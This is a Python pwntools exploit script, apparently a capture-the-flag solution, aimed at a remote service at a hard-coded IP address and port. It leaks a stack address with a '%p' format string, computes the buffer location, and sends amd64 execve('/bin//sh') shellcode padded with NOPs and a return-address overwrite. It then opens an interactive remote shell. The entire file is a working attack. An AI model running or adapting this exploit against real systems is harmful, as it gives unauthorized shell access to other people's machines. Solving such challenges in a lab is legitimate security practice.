from pwn import * # type: ignore  # noqa: F403

remote_conn = remote('35.209.254.29', 32392)  # type: ignore # noqa: F405
remote_conn.recvuntil(b'What\'s your name?')

# Send the format string '%p' to leak an address from the stack
remote_conn.sendline(b'%p')
remote_conn.recvuntil(b'Hello, ')

addr_buffer = int(remote_conn.recvline().decode().strip(), 16)

# Adjust the leaked address to point to the buffer location
addr_buffer += 0x26C0

# Log the address of the buffer for debugging purposes
log.info(f'name address: {hex(addr_buffer)}')  # type: ignore # noqa: F405
remote_conn.recvuntil(b'> ')

# Shellcode
shell_payload = asm(""" # type: ignore # type: ignore # type: ignore
xor rsi,rsi                      # Set rsi to 0 (null pointer for the environment)
push rsi                         # Push the null pointer onto the stack (argv[1])
mov rdi,0x68732f2f6e69622f       # Move the address of the string '/bin//sh' into rdi
push rdi                         # Push the string onto the stack (argv[0])
push rsp                         # Push the stack pointer onto the stack (argv pointer)
pop rdi                          # Pop the pointer to the string into rdi (first argument for execve)
push 59                          # Push the syscall number for execve (59) onto the stack
pop rax                          # Pop the syscall number into rax
cdq                              # Clear the rdx register (set it to 0 for execve)
syscall                          # Invoke the syscall to execute the command
""", arch='amd64', os='linux')  # noqa: F405

remote_conn.sendline(
    shell_payload +                  # Add the shellcode that will be executed
    b'\x90' * (40 - len(shell_payload)) +  # Pad the payload with NOP instructions to ensure a smooth jump to the shellcode
    p64(addr_buffer)                 # Append the packed address of the buffer where the shellcode resides  # noqa: F405 # type: ignore
)

remote_conn.interactive()